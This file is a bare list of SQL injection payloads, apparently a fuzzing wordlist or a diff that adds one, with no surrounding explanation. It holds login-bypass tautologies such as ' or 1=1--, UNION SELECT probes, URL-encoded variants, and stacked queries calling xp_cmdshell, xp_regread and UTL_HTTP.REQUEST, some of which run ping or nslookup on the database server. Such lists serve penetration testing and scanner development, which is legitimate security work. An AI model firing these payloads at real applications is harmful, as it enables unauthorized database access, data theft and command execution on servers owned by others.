+'; exec master..xp_cmdshell 'ping 172.10.1.255'--
+'%20or%20''='
+'%20or%20'x'='x
+')%20or%20('x'='x
+' or 0=0 --
+' or 0=0 #
+ or 0=0 #"
+' or 1=1--
+' or '1'='1'--
+' or 1 --'
+or 1=1--
+' or 1=1 or ''='
+ or 1=1 or ""=
+' or a=a--
+ or a=a
+') or ('a'='a
+'hi' or 'x'='x';
+' or username like '%
+' or uname like '%
+' or userid like '%
+' or uid like '%
+' or user like '%
+'; exec master..xp_cmdshell
+'; exec xp_regread
+t'exec master..xp_cmdshell 'nslookup www.google.com'--
+--sp_password
+' UNION SELECT
+' UNION ALL SELECT
+' or (EXISTS)
+' (select top 1
+'||UTL_HTTP.REQUEST
+1;SELECT%20*
+<>"'%;)(&+
+'%20or%201=1
+'sqlattempt1
+%28
+%29
+%26
+%21
+' or ''='
+' or 3=3
